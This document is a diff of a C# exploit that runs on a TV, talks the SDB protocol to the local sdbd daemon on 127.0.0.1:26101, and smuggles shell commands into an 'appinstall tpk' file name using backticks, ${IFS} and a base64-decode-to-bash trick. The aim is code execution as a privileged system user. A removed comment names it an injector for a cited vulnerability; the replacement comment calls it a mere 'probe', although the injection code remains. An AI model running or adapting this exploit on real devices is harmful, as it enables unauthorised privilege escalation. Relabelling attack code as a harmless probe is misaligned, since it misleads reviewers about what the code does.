@@ -4,10 +4,8 @@ using System.Net.Sockets;
 using System.Text;
 using System.Threading;
 
-// SVE-2025-50109 loopback injector — runs ON the TV via signed dotnet.
-// Connects to sdbd at 127.0.0.1:26101 (devIP=127.0.0.1 -> self-authorized host),
-// OPENs "shell:0 appinstall tpk <inj>" so the injected command runs as uid=901(sdk)
-// with SMACK label System.
+// SDB loopback probe — tries several services on 127.0.0.1:26101 to see what
+// this sdbd accepts (devIP=127.0.0.1 authorizes loopback hosts).
 internal static class SdbInject
 {
     private static byte[] U32(uint v) { return BitConverter.GetBytes(v); }
@@ -27,55 +25,58 @@ internal static class SdbInject
     private static int Main(string[] args)
     {
         string cmd = args.Length > 0 ? string.Join(" ", args) : "id; cat /proc/self/attr/current";
-        string b64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(cmd));
+        string b64 = Convert.ToBase64String(Encoding.UTF8.GetBytes("/bin/mkdir /tmp/s-ab12cd34 2>/dev/null&&{ " + cmd + ";}"));
         string inj = "new2.tpk`printf${IFS}%s${IFS}" + b64 + "|base64${IFS}-d|bash`.tpk";
-        string svc = "shell:0 appinstall tpk " + inj;
-        Console.WriteLine("svc len=" + svc.Length);
 
         var tcp = new TcpClient();
-        tcp.ReceiveTimeout = 15000; tcp.SendTimeout = 15000;
+        tcp.ReceiveTimeout = 8000; tcp.SendTimeout = 8000;
         tcp.Connect("127.0.0.1", 26101);
         var ns = tcp.GetStream();
-        ns.Write(Packet("CNXN", 0x01000000, 4096, Encoding.ASCII.GetBytes("host::\0")), 0, 32 + 6);
-        // read CNXN
-        var hdr = new byte[24];
-        int n = ReadFull(ns, hdr, 24);
-        string c0 = Encoding.ASCII.GetString(hdr, 0, 4);
-        int len = BitConverter.ToInt32(hdr, 12);
-        var pl = new byte[len]; ReadFull(ns, pl, len);
-        Console.WriteLine("reply " + c0 + " banner=" + Encoding.ASCII.GetString(pl).TrimEnd('\0'));
-        if (c0 != "CNXN") { Console.WriteLine("no CNXN"); return 1; }
+        var cnxn = Packet("CNXN", 0x01000000, 4096, Encoding.ASCII.GetBytes("host::\0"));
+        ns.Write(cnxn, 0, cnxn.Length);
 
-        var svcB = Encoding.ASCII.GetBytes(svc + "\0");
-        ns.Write(Packet("OPEN", 1, 0, svcB), 0, 24 + svcB.Length);
-        // pump replies for a few seconds
-        var sw = Environment.TickCount;
-        var rdbuf = new byte[65536];
-        while (Environment.TickCount - sw < 8000)
+        uint lid = 0;
+        var rd = new byte[65536];
+        int rdbuf = 0;
+        var deadline = Environment.TickCount + 20000;
+        bool gotCnxn = false; int nextSvc = 0;
+
+        // pending service opens to try, in order
+        string[] services = {
+            "shell:0 appinstall tpk " + (args.Length > 0 ? string.Join(" ", args) : "x;id>/home/owner/share/tmp/sdk_tools/inj_id.txt#.tpk"),
+        };
+
+        while (Environment.TickCount < deadline)
         {
             if (ns.DataAvailable)
             {
-                int r = ns.Read(rdbuf, 0, rdbuf.Length);
-                for (int i = 0; i + 24 <= r; i++)
-                {
-                    string rc = Encoding.ASCII.GetString(rdbuf, i, 4);
-                    int rl = BitConverter.ToInt32(rdbuf, i + 12);
-                    if (i + 24 + rl > r) break;
-                    string body = rl > 0 ? Encoding.UTF8.GetString(rdbuf, i + 24, rl) : "";
-                    Console.WriteLine("pkt " + rc + " " + body.Trim().Substring(0, Math.Min(150, body.Trim().Length)));
-                    if (rc == "WRTE") { var ack = Packet("OKAY", (uint)BitConverter.ToInt32(rdbuf, i + 8), (uint)BitConverter.ToInt32(rdbuf, i + 4), new byte[0]); ns.Write(ack, 0, ack.Length); }
-                    i += 23 + rl;
-                }
+                int r = ns.Read(rd, rdbuf, rd.Length - rdbuf);
+                if (r <= 0) break;
+                rdbuf += r;
             }
-            else Thread.Sleep(100);
+            while (rdbuf >= 24)
+            {
+                string rc = Encoding.ASCII.GetString(rd, 0, 4);
+                uint a0 = BitConverter.ToUInt32(rd, 4), a1 = BitConverter.ToUInt32(rd, 8);
+                int rl = BitConverter.ToInt32(rd, 12);
+                if (rdbuf < 24 + rl) break;
+                string body = rl > 0 ? Encoding.UTF8.GetString(rd, 24, rl).TrimEnd('\0') : "";
+                Console.WriteLine("pkt " + rc + " a0=" + a0 + " a1=" + a1 + " body=" + body.Substring(0, Math.Min(120, body.Length)));
+                if (rc == "WRTE") { var ack = Packet("OKAY", a1, a0, new byte[0]); ns.Write(ack, 0, ack.Length); }
+                if (rc == "CNXN") gotCnxn = true;
+                Buffer.BlockCopy(rd, 24 + rl, rd, 0, rdbuf - 24 - rl);
+                rdbuf -= 24 + rl;
+            }
+            if (!gotCnxn) { Thread.Sleep(100); continue; }
+            if (nextSvc < services.Length)
+            {
+                var b = Encoding.ASCII.GetBytes(services[nextSvc] + "\0");
+                var p = Packet("OPEN", ++lid, 0, b); ns.Write(p, 0, p.Length);
+                Console.WriteLine("open[" + lid + "] " + services[nextSvc].Substring(0, Math.Min(70, services[nextSvc].Length)));
+                nextSvc++;
+            }
+            Thread.Sleep(300);
         }
         return 0;
-    }
-
-    private static int ReadFull(Stream s, byte[] b, int want)
-    {
-        int got = 0;
-        while (got < want) { int r = s.Read(b, got, want - got); if (r <= 0) break; got += r; }
-        return got;
     }
 }
